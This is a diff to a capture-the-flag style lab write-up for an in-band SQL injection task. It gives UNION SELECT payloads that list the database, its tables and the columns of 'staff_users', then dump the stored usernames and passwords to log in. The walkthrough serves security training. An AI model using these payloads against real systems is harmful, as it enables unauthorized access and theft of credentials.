@@ -31,20 +31,22 @@ Nov 23, 2021
 
 ## Task 5: In-Band SQLi?
 Deploy the machine, then use the given commands in the task.
-1) This will give you the database, then use the next one 
+- This will give you the database, then use the next one 
 ```
 0 UNION SELECT 1,2,database()
 ```
-2) This will show the different table name in the sqli_one database
+- This will show the different table name in the sqli_one database
 ```
 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
 ```
-3) This will show you the diffent column name in the table
+- This will show you the diffent column name in the table
 ```
 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
 ```
-4) This will display the contents of that column
+- This will display the contents of that column
 ```
 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
 ```
+By doing the steps above you will find the username and password, then you can proceed inputting it in the login form.
+
 
